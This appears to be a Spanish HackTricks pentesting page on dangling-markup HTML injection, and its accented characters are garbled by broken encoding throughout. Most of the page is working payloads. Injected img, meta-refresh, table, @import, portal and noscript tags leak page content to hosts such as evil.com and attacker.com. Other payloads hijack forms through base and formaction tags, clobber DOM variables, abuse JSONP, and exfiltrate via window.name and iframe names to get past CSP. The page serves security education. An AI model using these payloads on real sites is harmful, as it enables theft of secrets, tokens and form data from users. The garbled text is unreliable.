# Dangling Markup - InyecciÃ³n HTML sin script

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- ObtÃ©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Resumen

Esta tÃ©cnica se puede utilizar para extraer informaciÃ³n de un usuario cuando se encuentra una **inyecciÃ³n HTML**. Esto es muy Ãºtil si **no se encuentra ninguna forma de explotar un** [**XSS** ](xss-cross-site-scripting/) pero se pueden **inyectar algunas etiquetas HTML**.\
TambiÃ©n es Ãºtil si algÃºn **secreto se guarda en texto claro** en el HTML y se quiere **exfiltrarlo** del cliente, o si se quiere engaÃ±ar la ejecuciÃ³n de algÃºn script.

Varias tÃ©cnicas comentadas aquÃ­ se pueden utilizar para evitar algunas [**PolÃ­ticas de Seguridad de Contenido**](content-security-policy-csp-bypass/) exfiltrando informaciÃ³n de formas inesperadas (etiquetas html, CSS, etiquetas http-meta, formularios, base...).

## Aplicaciones principales

### Robo de secretos en texto claro

Si se inyecta `<img src='http://evil.com/log.cgi?` cuando se carga la pÃ¡gina, la vÃ­ctima te enviarÃ¡ todo el cÃ³digo entre la etiqueta `img` inyectada y la siguiente comilla dentro del cÃ³digo. Si algÃºn secreto se encuentra de alguna manera en ese fragmento, lo robarÃ¡s (puedes hacer lo mismo usando una comilla doble, mira cuÃ¡l podrÃ­a ser mÃ¡s interesante de usar).

Si la etiqueta `img` estÃ¡ prohibida (debido a CSP, por ejemplo), tambiÃ©n se puede usar `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Ten en cuenta que **Chrome bloquea las URLs HTTP** con "<" o "\n", por lo que podrÃ­as probar con otros esquemas de protocolo como "ftp".

TambiÃ©n puedes abusar de `@import` de CSS (enviarÃ¡ todo el cÃ³digo hasta que encuentre un ";").
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
TambiÃ©n se puede usar **`<table`**:
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
TambiÃ©n se puede insertar una etiqueta `<base`. Toda la informaciÃ³n serÃ¡ enviada hasta que se cierre la comilla, pero esto requiere cierta interacciÃ³n del usuario (el usuario debe hacer clic en algÃºn enlace, ya que la etiqueta base habrÃ¡ cambiado el dominio al que apunta el enlace):
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### Robando formularios
```markup
<base href='http://evil.com/'>
```
Entonces, los formularios que envÃ­an datos a una ruta (como `<form action='update_profile.php'>`) enviarÃ¡n los datos al dominio malicioso.

### Robando formularios 2

Establece una cabecera de formulario: `<form action='http://evil.com/log_steal'>` esto sobrescribirÃ¡ la siguiente cabecera de formulario y todos los datos del formulario serÃ¡n enviados al atacante.

### Robando formularios 3

El botÃ³n puede cambiar la URL a donde se enviarÃ¡ la informaciÃ³n del formulario con el atributo "formaction":
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un atacante puede utilizar esto para robar informaciÃ³n.

### Robando secretos en texto claro 2

Utilizando la tÃ©cnica mencionada anteriormente para robar formularios (inyectando una nueva cabecera de formulario), se puede luego inyectar un nuevo campo de entrada:
```markup
<input type='hidden' name='review_body' value="
```
y este campo de entrada contendrÃ¡ todo el contenido entre sus comillas dobles y las siguientes comillas dobles en el HTML. Este ataque mezcla "_**Robo de secretos de texto claro**_" con "_**Robo de forms2**_".

Puedes hacer lo mismo inyectando un formulario y una etiqueta `<option>`. Todos los datos hasta que se encuentre un `</option>` cerrado serÃ¡n enviados:
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### InyecciÃ³n de parÃ¡metros de formulario

Puedes cambiar la ruta de un formulario e insertar nuevos valores para que se realice una acciÃ³n inesperada:
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user' 
  value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Robando secretos en texto claro a travÃ©s de noscript

`<noscript></noscript>` es una etiqueta cuyo contenido serÃ¡ interpretado si el navegador no admite JavaScript (puede habilitar/deshabilitar JavaScript en Chrome en [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Una forma de exfiltrar el contenido de la pÃ¡gina web desde el punto de inyecciÃ³n hasta el final a un sitio controlado por el atacante serÃ¡ inyectando esto:
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### SaltÃ¡ndose CSP con interacciÃ³n del usuario

En esta investigaciÃ³n de [PortSwigger](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) se puede aprender que incluso en los entornos con **mayor restricciÃ³n de CSP** todavÃ­a se puede **filtrar datos** con algo de **interacciÃ³n del usuario**. En esta ocasiÃ³n vamos a utilizar el payload:
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Ten en cuenta que pedirÃ¡s al **vÃ­ctima** que **haga clic en un enlace** que lo **redirigirÃ¡** a un **payload** controlado por ti. TambiÃ©n ten en cuenta que el atributo **`target`** dentro de la etiqueta **`base`** contendrÃ¡ **contenido HTML** hasta la siguiente comilla simple.\
Esto harÃ¡ que el **valor** de **`window.name`** si se hace clic en el enlace sea todo ese **contenido HTML**. Por lo tanto, como **controlas la pÃ¡gina** a la que accede la vÃ­ctima al hacer clic en el enlace, puedes acceder a ese **`window.name`** y **filtrar** esos datos:
```markup
<script>
if(window.name) {
    new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flujo de trabajo engaÃ±oso de script 1 - Ataque de espacio de nombres HTML

Inserte una nueva etiqueta con un id dentro del HTML que sobrescribirÃ¡ la siguiente y con un valor que afectarÃ¡ el flujo de un script. En este ejemplo, se estÃ¡ seleccionando con quiÃ©n se compartirÃ¡ la informaciÃ³n:
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
  ...
  request.share_with = document.getElementById('share_with').value;
  ...
}
```
### Flujo de trabajo engaÃ±oso de script 2 - Ataque de espacio de nombres de script

Crea variables dentro del espacio de nombres de JavaScript insertando etiquetas HTML. Luego, esta variable afectarÃ¡ el flujo de la aplicaciÃ³n:
```markup
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
  ...
  if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
    is_public = true;
  else
    is_public = false;
}

function submit_new_acls() {
  ...
  if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
  ...
}
```
### Abuso de JSONP

Si encuentras una interfaz JSONP, podrÃ­as ser capaz de llamar a una funciÃ³n arbitraria con datos arbitrarios:
```markup
<script src='/editor/sharing.js'>:              â† Legitimate script
  function set_sharing(public) {
    if (public) request.access_mode = AM_PUBLIC;
      else request.access_mode = AM_PRIVATE;
    ...
  }

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
  set_sharing({ ... })
```
O incluso puedes intentar ejecutar algÃºn javascript:
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Abuso de Iframe

Ten en cuenta que un **documento secundario puede ver y establecer la propiedad de ubicaciÃ³n para el padre, incluso si es de origen cruzado.** Esto significa que puedes hacer que el cliente acceda a cualquier otra pÃ¡gina cargando dentro de un **iframe** algÃºn cÃ³digo como:
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Esto se puede mitigar con algo como: _**sandbox=â€™ allow-scripts allow-top-navigationâ€™**_

Un iframe tambiÃ©n puede ser utilizado para filtrar informaciÃ³n sensible de una pÃ¡gina diferente **usando el atributo de nombre del iframe**. Esto se debe a que se puede crear un iframe que se iframe a sÃ­ mismo abusando de la inyecciÃ³n HTML que hace que la **informaciÃ³n sensible aparezca dentro del atributo de nombre del iframe** y luego acceder a ese nombre desde el iframe inicial y filtrarlo.
```html
<script>
    function cspBypass(win) {
        win[0].location = 'about:blank';
        setTimeout(()=>alert(win[0].name), 500); 
    }
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Para obtener mÃ¡s informaciÃ³n, consulte [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### Abuso de \<meta

Se puede utilizar **`meta http-equiv`** para realizar **varias acciones** como establecer una Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` o realizar una redirecciÃ³n (en este caso, en 5 segundos): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Esto se puede **evitar** con un **CSP** en relaciÃ³n con **http-equiv** (`Content-Security-Policy: default-src 'self';`, o `Content-Security-Policy: http-equiv 'self';`)

### Nuevo tag HTML \<portal>

Puede encontrar una investigaciÃ³n muy **interesante** sobre vulnerabilidades explotables del tag \<portal> [aquÃ­](https://research.securitum.com/security-analysis-of-portal-element/).\
En el momento de escribir esto, debe habilitar el tag portal en Chrome en `chrome://flags/#enable-portals` o no funcionarÃ¡.
```markup
<portal src='https://attacker-server?
```
### Fugas de HTML

No todas las formas de filtrar la conectividad en HTML serÃ¡n Ãºtiles para Dangling Markup, pero a veces podrÃ­a ayudar. CompruÃ©balas aquÃ­: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## XS-Search

XS-Search estÃ¡ orientado a **filtrar informaciÃ³n de origen cruzado** abusando de **ataques de canal lateral**. Por lo tanto, es una tÃ©cnica diferente a Dangling Markup, sin embargo, algunas de las tÃ©cnicas abusan de la inclusiÃ³n de etiquetas HTML (con y sin ejecuciÃ³n de JS), como [**InyecciÃ³n de CSS**](xs-search.md#css-injection) o [**Carga perezosa de imÃ¡genes**](xs-search.md#image-lazy-loading)**.**

{% content-ref url="xs-search.md" %}
[xs-search.md](xs-search.md)
{% endcontent-ref %}

## Lista de detecciÃ³n de fuerza bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Referencias

Todas las tÃ©cnicas presentadas aquÃ­ y mÃ¡s se pueden revisar con mÃ¡s detalles en:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

Otras etiquetas HTML que se pueden abusar se pueden encontrar aquÃ­:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

MÃ¡s informaciÃ³n:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Â¿Trabajas en una **empresa de ciberseguridad**? Â¿Quieres ver tu **empresa anunciada en HackTricks**? Â¿O quieres tener acceso a la **Ãºltima versiÃ³n de PEASS o descargar HackTricks en PDF**? Â¡Consulta los [**PLANES DE SUSCRIPCIÃ“N**](https://github.com/sponsors/carlospolop)!

- Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecciÃ³n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)

- **Ãšnete al** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sÃ­gueme** en **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
